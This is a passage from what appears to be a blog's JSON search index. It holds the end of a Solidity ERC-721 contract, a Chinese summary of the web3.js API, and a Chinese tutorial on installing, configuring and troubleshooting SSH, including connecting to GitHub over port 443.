require(_isApprovedOrOwner(from, msg.sender, id), &quot;not authorized&quot;);        _balanceOf[from]--;        _balanceOf[to]++;        _ownerOf[id] = to;        delete _approvals[id];        emit Transfer(from, to, id);    &#125;    function safeTransferFrom(address from, address to, uint id) external &#123;        transferFrom(from, to, id);        require(            to.code.length == 0 ||                IERC721Receiver(to).onERC721Received(msg.sender, from, id, &quot;&quot;) ==                IERC721Receiver.onERC721Received.selector,            &quot;unsafe recipient&quot;        );    &#125;    function safeTransferFrom(        address from,        address to,        uint id,        bytes calldata data    ) external &#123;        transferFrom(from, to, id);        require(            to.code.length == 0 ||                IERC721Receiver(to).onERC721Received(msg.sender, from, id, data) ==                IERC721Receiver.onERC721Received.selector,            &quot;unsafe recipient&quot;        );    &#125;    function _mint(address to, uint id) internal &#123;        require(to != address(0), &quot;mint to zero address&quot;);        require(_ownerOf[id] == address(0), &quot;already minted&quot;);        _balanceOf[to]++;        _ownerOf[id] = to;        emit Transfer(address(0), to, id);    &#125;    function _burn(uint id) internal &#123;        address owner = _ownerOf[id];        require(owner != address(0), &quot;not minted&quot;);        _balanceOf[owner] -= 1;        delete _ownerOf[id];        delete _approvals[id];        emit Transfer(owner, address(0), id);    &#125;&#125;\n","categories":["Ethereum"],"tags":["ERC"]},{"title":"web3.js","url":"/2023/04/11/web3-js/web3-js/","content":"\n此文档为web3.js 1.0的API整理，结合官方文档，参考了一些中译的整合篇。\n\nweb3.js是一组用来和本地或远程以太坊节点进行交互的js库，它可以使用HTTP或IPC建立与以太坊节点旳连接。\n\nweb3web3是顶层包，包含了所有以太坊相关的模块。\nweb3.version记录了web3容器对象的版本调用方法：Web3.version``web3.version返回值：String当前版本字符串实例：\n```## web3.modules返回一个包含所有子模块类的对象，可以用来手工实例化这些子模块类调用方法：返回值:* Eth(function)* Net(function)参见：!https://www.baidu.com* Personal(function)* Shh(function)* Bzz(function)实例：\n## web3.setProvider用来修改指定模块的底层通讯服务提供器调用方法：&gt; 注意：当在web3上直接调用setProvider()方法时，将为所有其他子模块设置服务提供器，例如web3.eth和web3.shh。 但web3.bzz不受影响，因为该子模块始终使用独立的服务提供器。参数：Object：有效的服务提供器对象返回值:Boolean实例：\n## web3.providers返回当前有效的通讯服务提供器调用方法：返回值：Object:  * Object-HttpProvider  * Object-WebsocketProvider  * Object-IpcProvider实例：\n## web3.BatchRequest用来创建并执行批请求调用方法：返回值：一个对象具有如下方法：    * add(request)：将请求对象添加到批调用中  * execute()：执行批请求实例：\n\n\n"},{"title":"rust","url":"/2025/09/08/rust/","content":""},{"title":"ssh","url":"/2025/09/10/ssh/","content":"1. SSH的基本概念1.1 公钥和私钥SSH 使用公钥加密技术来实现安全认证。每个用户都有一对密钥：公钥和私钥。公钥可以公开分享，而私钥必须保密。当用户尝试连接到远程服务器时，服务器会使用用户的公钥来验证用户的身份。如果验证成功，用户就可以访问服务器。\n1.2 SSH协议SSH 协议有两个主要版本：SSH-1 和 SSH-2。SSH-2 是当前的标准版本，提供了更强的安全性和功能。\n1.3 SSH客户端和服务器SSH 由两个主要组件组成：SSH 客户端和 SSH 服务器。SSH 客户端用于发起连接，而 SSH 服务器则在远程服务器上运行，等待客户端的连接请求。\n2. SSH的安装与配置在大多数 Linux 发行版中，SSH 客户端通常预装。当你尝试通过ssh命令连接到远程服务器时，如果出现Connection refused的情况，说明客户端能找到服务器，但服务器没有运行SSH服务。这时就需要检测服务器端的SSH服务是否安装并启动了。\n\n当然，第一步是要确认IP地址正确噢！！！\n\nsudo systemctl status ssh\n如果显示 inactive(dead) 或者 not found ，说明服务未启动或未安装。\n\n解决方式：sudo apt updatesudo apt install openssh-server -ysudo systemctl enable sshsudo systemctl start ssh\n\n如果服务启用中，那么需要检测防火墙设置和ssh端口设置：\n\n防火墙是否拦截：\nsudo ufw status\n如果看到 22/tcp DENY，说明防火墙拦截了22端口，需要放行：\nsudo ufw allow 22/tcpsudo ufw reload\n\nssh端口是否被修改：如果服务器中的sshd配置修改过，需要查看/etc/ssh/sshd_config文件中的Port配置项，确认端口号。\n\n\n如果没有，可以使用包管理器安装。例如，在 Debian&#x2F;Ubuntu 上，可以使用以下命令安装 OpenSSH 客户端：\n2.1 安装SSHsudo apt updatesudo apt install openssh-client\n要安装 SSH 服务器，可以使用以下命令：\nsudo apt install openssh-server\n2.2 配置SSHSSH 服务器的配置文件通常位于 /etc/ssh/sshd_config。可以使用文本编辑器（如 nano 或 vim）编辑该文件。例如：\nsudo nano /etc/ssh/sshd_config\n常见的配置选项包括：\n\nPort：指定 SSH 服务器监听的端口，默认是 22。\nPermitRootLogin：控制是否允许 root 用户通过 SSH 登录。\nPasswordAuthentication：启用或禁用基于密码的认证。\nPubkeyAuthentication：启用或禁用基于公钥的认证。\nAllowUsers：指定允许通过 SSH 登录的用户列表。\nMaxAuthTries：设置允许的最大认证尝试次数。\nClientAliveInterval 和 ClientAliveCountMax：配置客户端保持连接的心跳机制。\nLogLevel：设置日志记录的详细程度。\nBanner：指定登录时显示的欢迎信息文件路径。\n\n编辑完成后，保存文件并重启 SSH 服务以应用更改：\nsudo systemctl restart ssh\n3. 使用SSH进行远程连接3.1 基本连接要使用 SSH 连接到远程服务器，可以使用以下命令：\nssh username@hostname\n其中，username 是远程服务器上的用户名，hostname 是服务器的 IP 地址或域名。如果需要指定端口，可以使用 -p 选项：\nssh -p port_number username@hostname\n连接时，系统会提示输入密码。如果是第一次连接，系统会询问是否信任该主机，输入 yes 以继续。\n3.2 使用密钥认证常见问题：\nSSH 无法通过 22 端口连接到 GitHub\n通常是由于网络环境限制：国内网络访问端口被阻断；所在网络环境屏蔽端口等\nGitHub 提供了一个专门的 443 端口（一个HTTPS伪装的SSH），可以绕过网络屏蔽。\n你可以通过执行ssh -T -p 443 git@github.com验证是否是网络问题导致。\n如果成功，会提示：Hi &lt;username&gt;! You&#39;ve successfully authenticated, but GitHub does not provide shell access.\n因此最好的解决办法就是配置 .ssh/config 文件，\nHost github.com  HostName ssh.github.com  Port 443  User git\n这样的话每当你使用 ssh 命令时就会自动走指定的端口。\n"}]